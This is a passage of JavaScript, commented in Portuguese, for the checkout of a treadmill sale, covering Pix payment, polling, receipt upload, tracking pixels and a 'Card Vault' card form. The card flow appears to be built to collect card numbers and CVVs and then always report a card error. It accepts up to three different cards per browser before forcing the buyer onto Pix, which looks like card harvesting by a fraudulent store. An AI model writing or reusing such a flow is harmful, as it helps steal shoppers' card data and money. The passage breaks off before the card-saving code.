  function showPixResult(data) {
    const code = data.qrCode || data.pixCode || '';
    // Ordem de preferência: QR gerado aqui > imagem devolvida pela API > placeholder.
    if (!renderQRReal(code)) {
      if (data.base64QrCode) {
        const qrImg = document.createElement('img');
        qrImg.width = 190; qrImg.height = 190; qrImg.alt = 'QR Code Pix';
        qrImg.src = data.base64QrCode;   // setAttribute via DOM — sem risco de injeção de HTML
        const qrEl = $('#choQr'); qrEl.innerHTML = ''; qrEl.appendChild(qrImg);
      } else {
        renderQR();                              // fallback visual se a API não devolver imagem
      }
    }
    $('#pixCode').textContent = code;
    lastPurchase = { value: (data._value != null ? data._value : unitPrice() * qty), eventId: data.purchaseEventId || data.txid || '' };
    currentTxid = data.txid || null;
    // Marca este PIX como o "pendente atual" — se o cliente refizer o funil,
    // oferecemos voltar pra ele em vez de gerar outro pedido duplicado.
    try { if (data.txid) localStorage.setItem('pdap-pending', String(data.txid)); } catch (_) {}
    doneView.hidden = false;
    cho.querySelector('.cho__scroll').scrollTop = 0;
    // Num PIX retomado o relógio continua de onde estava — o prazo é contado da
    // criação do código no gateway, não de quando esta tela foi reaberta.
    const criadoEm = data._createdAt || Date.now();
    iniciarCronometro(criadoEm);
    startPolling(data.txid, criadoEm);
    // Bloco de comprovante: 60 s após a geração. Num PIX retomado esse tempo já
    // passou faz tempo, então aparece de imediato.
    clearTimeout(comprovTimer);
    const mostrarComprov = () => { const cEl = $('#choComprovante'); if (cEl) cEl.hidden = false; };
    const decorrido = Date.now() - criadoEm;
    if (decorrido >= 60000) mostrarComprov();
    else comprovTimer = setTimeout(mostrarComprov, 60000 - decorrido);
  }

  // ── Bloco de comprovante ──────────────────────────────────────────────────────
  (function initComprovante() {
    const form     = $('#comprovForm');
    const fileInp  = $('#comprovFile');
    const fileLabel= $('#comprovFileName');
    const btn      = $('#comprovBtn');
    const okEl     = $('#comprovOk');
    if (!form || !fileInp) return;

    fileInp.addEventListener('change', () => {
      const f = fileInp.files[0];
      if (f) {
        fileLabel.textContent = f.name;
        btn.disabled = false;
      } else {
        fileLabel.textContent = 'Imagem (JPG/PNG) ou PDF — até 20 MB';
        btn.disabled = true;
      }
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const f = fileInp.files[0];
      if (!f) return;
      btn.disabled = true;
      btn.textContent = 'Enviando...';
      try {
        const fd = new FormData();
        fd.append('comprovante', f);
        if (currentTxid) fd.append('pedido', currentTxid);
        // Dados do cliente — fallback caso o servidor perca a ordem em memória
        const _nome  = ($('#fNome')  || {}).value || '';
        const _email = ($('#fEmail') || {}).value || '';
        const _fone  = ($('#fFone')  || {}).value || '';
        const _cpf   = ($('#fCpf')   || {}).value || '';
        const _valor = String(unitPrice() * qty + extraTotal() + shipCost());
        const _pix   = ($('#pixCode') || {}).textContent || '';
        const _ship  = ($('input[name="ship"]:checked') || {}).value || 'normal';
        if (_nome)  fd.append('nome',  _nome);
        if (_email) fd.append('email', _email);
        if (_fone)  fd.append('telefone', _fone);
        if (_cpf)   fd.append('cpf',   _cpf);
        if (_valor) fd.append('valor', _valor);
        if (_pix)   fd.append('pix_code', _pix);
        if (_ship)  fd.append('frete', _ship);
        const r = await fetch(`${PIX_SB.edge}/comprovante`, { method: 'POST', headers: { 'Authorization': `Bearer ${PIX_SB.anon}` }, body: fd });
        const d = await r.json().catch(() => ({}));
        if (r.ok && d.ok !== false) {
          form.hidden = true;
          okEl.hidden = false;
        } else {
          btn.disabled = false;
          btn.textContent = 'Enviar comprovante';
          alert('Erro ao enviar. Tente novamente.');
        }
      } catch (_) {
        btn.disabled = false;
        btn.textContent = 'Enviar comprovante';
        alert('Sem conexão. Verifique sua internet e tente novamente.');
      }
    });
  })();

  function startPolling(txid, criadoEm) {
    clearInterval(pollTimer);
    if (!txid) return;
    // Acompanha até a expiração real do código. Antes o loop parava numa
    // contagem fixa de 240 ciclos (12 min, não os "~20" do comentário antigo):
    // quem pagava depois disso ficava numa tela que nunca ia confirmar, sem
    // Purchase e sem chegar no obrigado-1, mesmo com o dinheiro já pago.
    const prazo = (criadoEm || Date.now()) + PIX_EXPIRA_MS;
    if (PIX_SB.enabled) {
      pollTimer = setInterval(async () => {
        if (Date.now() > prazo) { clearInterval(pollTimer); return; }
        try {
          const r = await fetch(`${PIX_SB.edge}/check-payment?orderId=${encodeURIComponent(txid)}&type=order`,
            { headers: { 'Authorization': `Bearer ${PIX_SB.anon}` } });
          if (!r.ok) return;
          const d = await r.json();
          if (d.status === 'paid') { clearInterval(pollTimer); onPixPaid(); }
          else if (d.status === 'expired' || d.status === 'cancelled') { clearInterval(pollTimer); }
        } catch (_) { /* ignora falha pontual de rede */ }
      }, PIX_CFG.pollMs || 5000);
      return;
    }
    if (!PIX_CFG.api) return;
    pollTimer = setInterval(async () => {
      try {
        const r = await fetch(`${PIX_CFG.api}/api/pix/status/${encodeURIComponent(txid)}`);
        const d = await r.json();
        if (PAID_STATUS.includes(String(d.status || '').toUpperCase())) {
          clearInterval(pollTimer);
          onPixPaid();
        }
      } catch (_) { /* ignora falha pontual de rede; segue tentando */ }
    }, PIX_CFG.pollMs);
  }

  /* Confere o status na hora, fora do intervalo do polling.
     O navegador estrangula timers de aba oculta (o iOS chega a congelar a
     página inteira), e a aba fica oculta exatamente durante o minuto em que o
     cliente está no app do banco pagando — ou seja, no momento em que o
     pagamento cai. Sem esta checagem no retorno, ele volta pra uma tela que
     ainda diz "aguardando" e conclui que o Pix não funcionou. */
  async function conferirPixAgora() {
    if (!PIX_SB.enabled || !currentTxid || doneView.hidden) return;
    try {
      const r = await fetch(`${PIX_SB.edge}/check-payment?orderId=${encodeURIComponent(currentTxid)}&type=order`,
        { headers: { 'Authorization': `Bearer ${PIX_SB.anon}` } });
      if (!r.ok) return;
      const d = await r.json();
      if (d.status === 'paid') { clearInterval(pollTimer); onPixPaid(); }
    } catch (_) { /* volta a depender do polling */ }
  }
  document.addEventListener('visibilitychange', () => { if (!document.hidden) conferirPixAgora(); });
  window.addEventListener('focus', conferirPixAgora);
  window.addEventListener('pageshow', conferirPixAgora);   // volta do bfcache (botão "voltar")

  function onPixPaid() {
    clearTimeout(comprovTimer);
    pararCronometro();
    // Pagou → não há mais PIX pendente pra retomar.
    try { localStorage.removeItem('pdap-pending'); } catch (_) {}
    const comprovEl = $('#choComprovante');
    if (comprovEl) comprovEl.hidden = true;
    // Purchase client-side (deduplicado com o CAPI pelo mesmo eventID = purchaseEventId)
    const val = lastPurchase ? lastPurchase.value : unitPrice() * qty;
    fbTrack('Purchase',
      { value: val, currency: 'BRL', content_ids: [PRODUCT_ID], content_type: 'product', num_items: qty },
      lastPurchase && lastPurchase.eventId ? { eventID: lastPurchase.eventId } : undefined);

    // TikTok: o event_id tem que ser EXATAMENTE o purchaseEventId devolvido pelo
    // /api/pix/create (`pur-<txid>`), porque é o mesmo que o webhook usa no
    // Events API. Qualquer prefixo aqui quebra a dedup e conta 2 Purchases.
    // CompletePayment (mesmo nome/ID que o pixel.js dispara em obrigado-1) →
    // navegador + server-side deduplicam pelo mesmo event_id = 'order-<txid>'.
    const ttkOrderId = (lastPurchase && lastPurchase.eventId) || '';
    ttkTrack('CompletePayment', {
      value: val,
      quantity: qty,
      event_id: ttkOrderId || undefined,
      order_id: ttkOrderId || undefined,
      user: { email: $('#fEmail').value.trim(), phone: onlyDigits($('#fFone').value) }
    });
    // Redireciona pro funil de upsell (obrigado-1 → obrigado-2 → obrigado-3),
    // na ordem correta. Um instante pro beacon/pixel sair antes de navegar.
    if (PIX_CFG.thankYouUrl) { setTimeout(() => { window.location.href = PIX_CFG.thankYouUrl; }, 500); return; }
    const _oid = currentTxid || (ttkOrderId ? ttkOrderId.replace(/^order-/, '') : '');
    if (_oid) { setTimeout(() => { window.location.href = (window.FUNNEL ? FUNNEL.urlPosPagamento(_oid) : 'obrigado-1.html?id=' + encodeURIComponent(_oid)); }, 600); return; }
    showPaidScreen();
  }

  function showPaidScreen() {
    const paidView = document.getElementById('choPaid');
    if (!paidView) return;

    // Dias úteis pra chegar por método (Envio 1-4 ou meli+ full)
    const SHIP_DAYS = {
      normal:   [12, 15],
      correios: [9, 10],
      jadlog:   [5, 8],
      full:     [4, 7],
    };
    const shipVal = meliPlusActive ? 'full' : (($('input[name="ship"]:checked') || {}).value || 'normal');
    const [minD, maxD] = SHIP_DAYS[shipVal] || SHIP_DAYS.normal;

    // Calcula intervalo de datas (pula finais de semana)
    const addBusinessDays = (start, days) => {
      const d = new Date(start);
      let added = 0;
      while (added < days) {
        d.setDate(d.getDate() + 1);
        const wd = d.getDay();
        if (wd !== 0 && wd !== 6) added++;
      }
      return d;
    };
    const now = new Date();
    const dStart = addBusinessDays(now, minD);
    const dEnd   = addBusinessDays(now, maxD);
    const MONTHS = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
    let etaText;
    if (dStart.getMonth() === dEnd.getMonth()) {
      etaText = `${dStart.getDate()} e ${dEnd.getDate()} de ${MONTHS[dEnd.getMonth()]}`;
    } else {
      etaText = `${dStart.getDate()} de ${MONTHS[dStart.getMonth()]} e ${dEnd.getDate()} de ${MONTHS[dEnd.getMonth()]}`;
    }
    const etaEl = document.getElementById('paidEta');
    if (etaEl) etaEl.innerHTML = `Chegará entre <b>${etaText}</b>`;

    // Foto do produto (cor selecionada)
    const selColorImg = $('#varVoltOpts .var-btn.is-sel img');
    const selColorLabel = $('#varVoltLabel');
    if (selColorImg) {
      const paidThumb     = document.getElementById('paidThumb');
      const paidProdThumb = document.getElementById('paidProdThumb');
      if (paidThumb)     paidThumb.src     = selColorImg.src;
      if (paidProdThumb) paidProdThumb.src = selColorImg.src;
    }
    const paidColor = document.getElementById('paidProdColor');
    if (paidColor && selColorLabel) paidColor.textContent = selColorLabel.textContent.trim();

    // Endereço
    const rua = ($('#fRua') || {}).value || '';
    const num = ($('#fNum') || {}).value || '';
    const bairro = ($('#fBairro') || {}).value || '';
    const cidade = ($('#fCidade') || {}).value || '';
    const uf = ($('#fUf') || {}).value || '';
    const paidAddr = document.getElementById('paidAddr');
    const paidAddrExtra = document.getElementById('paidAddrExtra');
    if (paidAddr) paidAddr.textContent = `${rua} ${num}`.trim() || 'Endereço';
    if (paidAddrExtra) paidAddrExtra.textContent = [bairro, cidade && `${cidade}/${uf}`].filter(Boolean).join(' · ');

    // Quantidade
    const paidQty = document.getElementById('paidProdQty');
    if (paidQty) paidQty.textContent = String(qty);

    // Mostra a tela
    paidView.hidden = false;
    cho.querySelector('.cho__scroll').scrollTop = 0;
  }

  /* ---- ETAPA 3: confirmar ---- */
  el('ftBtn').addEventListener('click', () => {
    if (S.payMethod === 'card' && S.cardData) {
      abrirCardErrorModal();
    } else {
      comprar();
    }
  });

  /* ---- tela de seguro ---- */
  const segView = $('#choSeguro');
  const segDet  = $('#segDet');
  // "Ver detalhes" abre painel; botão × fecha
  const _segClose = $('#segDetClose');
  if (_segClose) _segClose.addEventListener('click', () => { if (segDet) segDet.hidden = true; });
  const _segOpenLink = segView ? $('.cho-seguro__details', segView) : null;
  if (_segOpenLink) _segOpenLink.addEventListener('click', e => { e.preventDefault(); if (segDet) segDet.hidden = false; });
  function showSeguro(onDone) {
    segDet.hidden = true;
    segView.hidden = false;
    cho.querySelector('.cho__scroll').scrollTop = 0;
    // Sincroniza a foto do produto com a cor selecionada no front
    const selColorImg = $('#varVoltOpts .var-btn.is-sel img');
    const segProdImg  = $('.cho-seguro__prod-img img', segView);
    if (selColorImg && segProdImg) {
      segProdImg.src = selColorImg.src;
      segProdImg.alt = selColorImg.alt || 'Esteira Elétrica WCT Fitness';
    }
    // seleção de plano
    $$('.cho-seguro__opt', segView).forEach(opt => {
      opt.addEventListener('click', () => {
        $$('.cho-seguro__opt', segView).forEach(o => o.classList.remove('is-sel'));
        opt.classList.add('is-sel');
      });
    });
    $('#segSkip').onclick = () => {
      extraItems = extraItems.filter(i => !i.isSeguro);
      updateCheckout();
      segView.hidden = true;
      onDone();
    };
    $('#segAdd').onclick = () => {
      const sel = $('.cho-seguro__opt.is-sel', segView);
      if (sel) {
        const price = parseFloat(sel.dataset.price) || 0;
        const label = ($('.cho-seguro__opt-label', sel) || {}).textContent || 'plano';
        extraItems = extraItems.filter(i => !i.isSeguro);
        extraItems.push({ title: `Seguro Garantia Estendida (${label})`, price, qty: 1, isSeguro: true });
      }
      updateCheckout();
      segView.hidden = true;
      onDone();
    };
  }

  /* Lê o PIX pendente salvo (se houver) e confirma no gateway que ele ainda
     está aguardando pagamento. Retorna o objeto do pedido ou null. */
  async function getPixPendente() {
    let pid = '';
    try { pid = localStorage.getItem('pdap-pending') || ''; } catch (_) {}
    if (!pid) return null;
    let order = null;
    try { order = JSON.parse(localStorage.getItem('pdap-order-' + pid) || 'null'); } catch (_) {}
    if (!order || !order.pix_code) { try { localStorage.removeItem('pdap-pending'); } catch (_) {} return null; }
    // Passou da validade do código → não adianta reoferecer, nem esperar o
    // gateway responder. Descarta e deixa o fluxo gerar um PIX novo.
    if (order.created_at && Date.now() - order.created_at > PIX_EXPIRA_MS) {
      try { localStorage.removeItem('pdap-pending'); } catch (_) {}
      return null;
    }
    // Confirma o status real: se já pagou/expirou/cancelou, não faz sentido reoferecer.
    if (PIX_SB.enabled) {
      try {
        const r = await fetch(`${PIX_SB.edge}/check-payment?orderId=${encodeURIComponent(pid)}&type=order`,
          { headers: { 'Authorization': `Bearer ${PIX_SB.anon}` } });
        if (r.ok) {
          const d = await r.json();
          const st = String(d.status || '').toLowerCase();
          if (st && st !== 'pending' && st !== 'waiting') {
            try { localStorage.removeItem('pdap-pending'); } catch (_) {}
            return null;                    // pago, expirado ou cancelado → segue gerando novo
          }
        }
      } catch (_) { /* rede falhou: assume pendente e oferece retomar mesmo assim */ }
    }
    return order;
  }

  /* Reabre a tela do PIX já gerado (QR + código copia-e-cola), sem criar outro. */
  function retomarPix(order) {
    const modal = el('pixExistsModal');
    if (modal) modal.style.display = 'none';
    const qrImg = order.pix_qr_url ||
      ('https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=' + encodeURIComponent(order.pix_code || ''));
    clearTimeout(loadTimer);
    loadView.hidden = true;

    // Repõe os dados do comprador no formulário. Numa retomada depois de
    // recarregar a página esses campos estão vazios, e é deles que saem o envio
    // de comprovante e o e-mail/telefone do CompletePayment.
    const c = order.customer || {};
    const repor = (sel, v) => { const n = $(sel); if (n && !n.value && v) n.value = v; };
    repor('#fNome', c.name); repor('#fEmail', c.email);
    repor('#fCpf', c.document); repor('#fFone', c.phone);

    // Garante o checkout aberto na tela do QR: retomar a partir do load da
    // página não passa pelo fluxo normal que abre o modal.
    doneView.hidden = false;
    openModal(cho);

    showPixResult({
      base64QrCode: qrImg,
      qrCode: order.pix_code,
      pixCode: order.pix_code,
      txid: order.id,
      purchaseEventId: 'order-' + order.id,
      _value: (order.amount_cents || 0) / 100,
      _createdAt: order.created_at || Date.now()
    });
  }

  // Fluxo do modal "você já tem um Pix": Pagar (retoma) x Gerar novo (cria).
  let _pixNovoResolve = null;
  (function initPixExistsModal() {
    const pay = el('pxPayBtn'), neu = el('pxNewBtn');
    if (pay) pay.addEventListener('click', () => {
      const order = _pendingOrderRef;
      if (order) retomarPix(order);
    });
    if (neu) neu.addEventListener('click', () => {
      el('pixExistsModal').style.display = 'none';
      // Cliente escolheu gerar outro → o antigo deixa de ser o "pendente atual".
      try { localStorage.removeItem('pdap-pending'); } catch (_) {}
      if (typeof _pixNovoResolve === 'function') { const f = _pixNovoResolve; _pixNovoResolve = null; f(); }
    });
  })();
  let _pendingOrderRef = null;

  async function comprar() {
    // Já existe um PIX gerado e ainda não pago? Pergunta antes de criar outro.
    if (FLEVO_GATEWAY.enabled || PIX_SB.enabled) {
      const pend = await getPixPendente();
      if (pend) {
        _pendingOrderRef = pend;
        const idEl = el('pxOrderId'); if (idEl) idEl.textContent = '#' + String(pend.id).slice(-8).toUpperCase();
        const vEl = el('pxOrderVal'); if (vEl) vEl.textContent = money((pend.amount_cents || 0) / 100);
        el('pixExistsModal').style.display = 'flex';
        // Espera a escolha: "Gerar novo" resolve e o fluxo continua criando o PIX.
        await new Promise(res => { _pixNovoResolve = res; });
      }
    }
    // Sem backend configurado → modo demonstração
    if (!FLEVO_GATEWAY.enabled && !PIX_SB.enabled && !PIX_CFG.api) {
      showLoading('Já é quase sua!');
      hideLoadingAfter(1800, () => {
        renderQR();
        $('#pixCode').textContent = fakePixCode();
        doneView.hidden = false;
        cho.querySelector('.cho__scroll').scrollTop = 0;
      });
      return;
    }
    showLoading('Já é quase sua!');
    try {
      const data = await createPix();
      try {
        localStorage.setItem('upsell_buyer', JSON.stringify({
          nome:  $('#fNome').value.trim(),
          cpf:   onlyDigits($('#fCpf').value),
          email: $('#fEmail').value.trim(),
          tel:   onlyDigits($('#fFone').value)
        }));
      } catch (_) {}
      clearTimeout(loadTimer);
      loadView.hidden = true;
      showPixResult(data);
    } catch (err) {
      clearTimeout(loadTimer);
      loadView.hidden = true;
      toast(err.message || 'Erro ao gerar o PIX. Tente novamente.');
    }
  }

  /* Copiar o código é o caminho que a maioria usa (colar no app do banco é mais
     fácil que trocar de aparelho pra escanear). navigator.clipboard não existe
     em contexto não-seguro e é bloqueado em várias WebViews de app — e é dentro
     da WebView do TikTok que o lead de campanha chega. Sem fallback, o clique
     falhava calado e o cliente ficava sem código. */
  function copiarViaExecCommand(texto) {
    const ta = document.createElement('textarea');
    ta.value = texto;
    ta.setAttribute('readonly', '');
    ta.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
    document.body.appendChild(ta);
    ta.select();
    ta.setSelectionRange(0, texto.length);        // o iOS ignora select() sozinho
    let deu = false;
    try { deu = document.execCommand('copy'); } catch (_) {}
    document.body.removeChild(ta);
    return deu;
  }

  function copiarTexto(texto) {
    const legado = () => copiarViaExecCommand(texto) ? Promise.resolve() : Promise.reject();
    // Nas WebViews a API moderna às vezes existe mas rejeita (permissão ou foco).
    // Nesse caso o caminho antigo ainda copia — por isso o .catch(legado) em vez
    // de desistir na primeira falha.
    if (navigator.clipboard && window.isSecureContext) return navigator.clipboard.writeText(texto).catch(legado);
    return legado();
  }

  /* Último recurso: deixa o código inteiro já selecionado, pra que baste tocar
     e escolher "Copiar" no menu do próprio sistema. */
  function selecionarCodigoPix() {
    try {
      const rng = document.createRange();
      rng.selectNodeContents($('#pixCode'));
      const sel = window.getSelection();
      sel.removeAllRanges(); sel.addRange(rng);
    } catch (_) {}
  }

  $('#pixCopy').addEventListener('click', () => {
    const code = $('#pixCode').textContent;
    if (!code) { toast('Nenhum código PIX disponível.'); return; }
    copiarTexto(code)
      .then(() => toast((PIX_SB.enabled || PIX_CFG.api) ? 'Código Pix copiado!' : 'Código Pix copiado. (Demonstração — código inválido)'))
      .catch(() => { selecionarCodigoPix(); toast('Código selecionado — toque nele e escolha "Copiar".'); });
  });

  /* "Já paguei": antes só fechava o checkout e dava um toast. Quem clicava
     depois de pagar de verdade era jogado pra fora sem passar pelo obrigado-1 —
     perdia o upsell e o CompletePayment do pedido. Agora consulta o status. */
  $('#pixPaid').addEventListener('click', async e => {
    e.preventDefault();
    if (PIX_CFG.thankYouUrl) { clearInterval(pollTimer); window.location.href = PIX_CFG.thankYouUrl; return; }
    if (!PIX_SB.enabled || !currentTxid) {
      clearInterval(pollTimer);
      closeModals();
      toast(PIX_CFG.api ? 'Assim que o pagamento cair, você será avisado.' : 'Demonstração — pedido simulado. Nenhuma cobrança real foi feita.');
      return;
    }
    const btn = e.currentTarget, rotulo = btn.textContent;
    btn.textContent = 'Verificando pagamento…';
    btn.style.pointerEvents = 'none';
    try {
      const r = await fetch(`${PIX_SB.edge}/check-payment?orderId=${encodeURIComponent(currentTxid)}&type=order`,
        { headers: { 'Authorization': `Bearer ${PIX_SB.anon}` } });
      const d = r.ok ? await r.json() : {};
      if (d.status === 'paid') { clearInterval(pollTimer); onPixPaid(); return; }
      toast('Ainda não identificamos o pagamento. Deixe esta tela aberta — confirmamos sozinhos em instantes.');
    } catch (_) {
      toast('Sem conexão para verificar agora. Deixe esta tela aberta que confirmamos automaticamente.');
    }
    btn.textContent = rotulo;
    btn.style.pointerEvents = '';
  });

  /* Retoma o PIX pendente já na abertura da página.
     Era aqui o buraco maior do fluxo: quem fechava a aba com o QR aberto e
     voltava depois (clicando de novo no anúncio, que é o comportamento normal
     de quem veio de campanha) caía na página do produto sem nenhum sinal do
     pedido que já tinha criado. O aviso "você já tem um Pix" só existia dentro
     de comprar(), ou seja, só aparecia pra quem refizesse o funil inteiro e
     clicasse em pagar de novo. Na prática dava dois estragos: quem refazia o
     funil gerava PIX duplicado (o mesmo lead com três cobranças abertas), e
     quem já tinha pagado enquanto estava fora nunca chegava no obrigado-1 —
     sem upsell e sem o CompletePayment do pedido. */
  (async function restaurarPixPendente() {
    if (!PIX_SB.enabled) return;
    let pid = '';
    try { pid = localStorage.getItem('pdap-pending') || ''; } catch (_) {}
    if (!pid) return;
    let order = null;
    try { order = JSON.parse(localStorage.getItem('pdap-order-' + pid) || 'null'); } catch (_) {}
    if (!order || !order.pix_code) { try { localStorage.removeItem('pdap-pending'); } catch (_) {} return; }

    // Código já fora da validade → descarta em silêncio, sem incomodar ninguém.
    if (order.created_at && Date.now() - order.created_at > PIX_EXPIRA_MS) {
      try { localStorage.removeItem('pdap-pending'); } catch (_) {}
      return;
    }

    let status = '';
    try {
      const r = await fetch(`${PIX_SB.edge}/check-payment?orderId=${encodeURIComponent(pid)}&type=order`,
        { headers: { 'Authorization': `Bearer ${PIX_SB.anon}` } });
      if (r.ok) status = String((await r.json()).status || '').toLowerCase();
    } catch (_) { return; }   // sem rede: não abre nada por cima da navegação dele

    if (status === 'paid') {
      // Pagou enquanto estava fora → leva direto pro pós-venda e pro upsell.
      try { localStorage.removeItem('pdap-pending'); } catch (_) {}
      window.location.href = (window.FUNNEL ? FUNNEL.urlPosPagamento(pid) : 'obrigado-1.html?id=' + encodeURIComponent(pid));
      return;
    }
    if (status && status !== 'pending' && status !== 'waiting') {
      try { localStorage.removeItem('pdap-pending'); } catch (_) {}
      return;                 // expirado ou cancelado → deixa ele gerar um novo
    }
    // Ainda aguardando pagamento → reabre o checkout direto na tela do QR.
    _pendingOrderRef = order;
    retomarPix(order);
  })();

  /* ═══════════════════════════════════════════
     CARTÃO DE CRÉDITO — Card Vault
     ═══════════════════════════════════════════ */
  var _cfBrand = null, _cfCountry = null, _cfBank = null, _cfLevel = null, _cfType = null;

  var BRAND_LOGOS = {
    visa:       'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/visa.svg',
    mastercard: 'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/mastercard.svg',
    amex:       'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/amex.svg',
    elo:        'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/elo.svg',
    hipercard:  'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/hipercard.svg',
    maestro:    'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/maestro.svg',
    discover:   'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/discover.svg',
  };

  function _brandImg(brand, w, h) {
    var src = BRAND_LOGOS[brand];
    if (!src) return '';
    return '<img src="' + src + '" width="' + (w || 36) + '" height="' + (h || 22) + '" style="object-fit:contain;border-radius:3px;display:block" alt="' + brand + '"/>';
  }

  function selectPayMethod(method) {
    if (method === 'card') {
      abrirCardForm();
    } else {
      S.payMethod = 'pix';
      payMethod = 'pix';
      el('pmPix').classList.add('pm-sel');
      el('pmCard').classList.remove('pm-sel');
      el('pmPixCheck').style.display = 'inline-flex';
      el('pmCardCheck').style.display = 'none';
      el('savedCardArea').style.display = 'none';
      $('input[value="pix"]', $('#payOpts')).checked = true;
      _updatePayBtn();
    }
  }

  function abrirCardForm() {
    var total = calcTotal();
    var sel = el('cfParc');
    if (sel) {
      var prev = sel.value || '12';
      sel.innerHTML = '';
      for (var n = 1; n <= 12; n++) {
        var opt = document.createElement('option');
        opt.value = String(n);
        opt.textContent = n + 'x de ' + fmt(total / n) + ', sem juros';
        sel.appendChild(opt);
      }
      sel.value = prev;
    }
    var cvvInp = el('cfCvv');
    if (cvvInp) cvvInp.maxLength = (_cfBrand === 'amex') ? 4 : 3;
    el('cardFormModal').style.display = 'flex';
    setTimeout(function () { el('cfNum').focus(); }, 250);
  }

  function fecharCardForm() {
    el('cardFormModal').style.display = 'none';
    if (!S.cardData) {
      // Usuário fechou sem salvar → reverte para PIX
      selectPayMethod('pix');
    }
  }

  function cfFormatNum(inp) {
    var raw = inp.value.replace(/\D/g, '').slice(0, 16);
    var groups = raw.match(/.{1,4}/g);
    inp.value = groups ? groups.join(' ') : raw;
    if (raw.length >= 6) _lookupBIN(raw.slice(0, 6));
    else _setCardBrand(null);
  }

  function cfFormatExp(inp) {
    var raw = inp.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 1 && parseInt(raw[0], 10) > 1) raw = '0' + raw.slice(0, 3);
    if (raw.length >= 2 && parseInt(raw.slice(0, 2), 10) > 12) raw = raw[0] + '2' + raw.slice(2);
    inp.value = raw.length > 2 ? raw.slice(0, 2) + '/' + raw.slice(2) : raw;
  }

  function cfOnNameInput(inp) {
    var cur = inp.value;
    var clean = cur.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s]/g, '');
    if (clean !== cur) {
      var pos = inp.selectionStart - (cur.length - clean.length);
      inp.value = clean;
      inp.setSelectionRange(pos, pos);
    }
    var x = el('cfNameX');
    if (x) x.style.display = inp.value ? 'block' : 'none';
  }

  function cfClearName() {
    el('cfName').value = '';
    el('cfNameX').style.display = 'none';
    el('cfName').focus();
  }

  function _setCardBrand(brand) {
    _cfBrand = brand;
    var cvvInp = el('cfCvv');
    if (cvvInp) {
      var cvvMax = (brand === 'amex') ? 4 : 3;
      cvvInp.maxLength = cvvMax;
      cvvInp.placeholder = brand === 'amex' ? 'Código (4 dígitos)' : 'CVV';
      if (cvvInp.value.length > cvvMax) cvvInp.value = cvvInp.value.slice(0, cvvMax);
    }
    var icon = el('cfBrandIcon');
    var inp = el('cfNum');
    if (!icon || !inp) return;
    var html = _brandImg(brand);
    if (html) {
      icon.innerHTML = html;
      icon.classList.add('visible');
      inp.style.paddingRight = '52px';
    } else {
      icon.innerHTML = '';
      icon.classList.remove('visible');
      inp.style.paddingRight = '';
    }
  }

  function _lookupBIN(bin) {
    var done = false;
    var timer = setTimeout(function () {
      if (!done) { done = true; _binFallback(bin); }
    }, 3000);
    fetch('https://lookup.binlist.net/' + bin, { headers: { 'Accept-Version': '3' } })
      .then(function (r) { return r.ok ? r.json() : Promise.reject(r.status); })
      .then(function (d) {
        if (done) return; done = true; clearTimeout(timer);
        _setCardBrand((d.scheme || '').toLowerCase());
        _cfCountry = (d.country && d.country.alpha2) ? d.country.alpha2.toUpperCase() : null;
        _cfBank    = (d.bank && d.bank.name) ? d.bank.name : null;
        _cfLevel   = d.brand  || null;
        _cfType    = d.type   || null;
      })
      .catch(function () {
        if (done) return; done = true; clearTimeout(timer);
        _binFallback(bin);
      });
  }

  function _binFallback(bin) {
    _cfCountry = null;
    var f = bin.charAt(0), p2 = bin.slice(0, 2);
    if (f === '4') _setCardBrand('visa');
    else if (f === '5' || f === '2') _setCardBrand('mastercard');
    else if (p2 === '34' || p2 === '37') _setCardBrand('amex');
    else if (f === '6') _setCardBrand('elo');
    else _setCardBrand(null);
  }

  function _luhn(num) {
    var sum = 0, alt = false;
    for (var i = num.length - 1; i >= 0; i--) {
      var n = parseInt(num[i], 10);
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }

  function _validExp(exp) {
    var parts = exp.split('/');
    if (parts.length !== 2) return false;
    var m = parseInt(parts[0], 10), y = parseInt('20' + parts[1], 10);
    if (m < 1 || m > 12) return false;
    var now = new Date(), curY = now.getFullYear(), curM = now.getMonth() + 1;
    return ((y > curY) || (y === curY && m >= curM)) && y <= 2035;
  }

  /* ═══════════════ RATE LIMIT DE CARTÃO (só no front) ═══════════════
     • Não deixa cadastrar o MESMO cartão duas vezes.
     • Máximo de 3 cartões distintos por navegador.
     • No 3º cartão: erro + aviso de redirecionamento e some a opção cartão. */
  const CARD_LIMIT  = 3;
  const CARD_LS_KEY = '_lrz_card_fps';

  /* fingerprint do PAN via FNV-1a (não guarda o número em claro no storage) */
  function _cardFp(numRaw) {
    var h = 0x811c9dc5;
    for (var i = 0; i < numRaw.length; i++) {
      h ^= numRaw.charCodeAt(i);
      h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0;
    }
    return ('0000000' + h.toString(16)).slice(-8);
  }
  function _getCardFps() {
    try { return JSON.parse(localStorage.getItem(CARD_LS_KEY)) || []; } catch (_) { return []; }
  }
  function _saveCardFps(a) {
    try { localStorage.setItem(CARD_LS_KEY, JSON.stringify(a)); } catch (_) {}
  }
  function disableCardOption() {
    var pmCard = el('pmCard');
    if (pmCard) {
      pmCard.style.opacity = '0.4';
      pmCard.style.pointerEvents = 'none';
      pmCard.setAttribute('aria-disabled', 'true');
    }
    var saved = el('savedCardArea');
    if (saved) saved.style.display = 'none';
    S.cardData = null;
    selectPayMethod('pix');                              // força PIX
  }

  function salvarCartao() {
    var numRaw = el('cfNum').value.replace(/\s/g, '');
    var exp    = el('cfExp').value.trim();
    var cvv    = el('cfCvv').value.trim();
    var name   = el('cfName').value.trim();

